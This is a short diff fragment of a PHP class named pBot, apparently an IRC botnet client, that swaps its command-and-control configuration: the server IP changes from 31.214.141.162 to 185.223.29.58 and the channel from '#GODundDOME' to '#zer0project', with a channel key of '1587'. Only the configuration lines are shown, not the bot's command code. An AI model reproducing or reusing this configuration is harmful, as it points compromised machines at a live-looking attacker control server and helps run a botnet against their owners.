@@ -4,12 +4,12 @@
 	 
 	class pBot {
 		var $config = array(
-			"server"=> "31.214.141.162",
+			"server"=> "185.223.29.58",
 			"port"=> 6667,
 			"pass"=> "",
 			"prefix"=> "",
 			"maxrand"=> 15,
-			"chan"=> "#GODundDOME",
+			"chan"=> "#zer0project",
 			"key"=> "1587",
 			"modes"=> "+p",
 			"password"=> "",
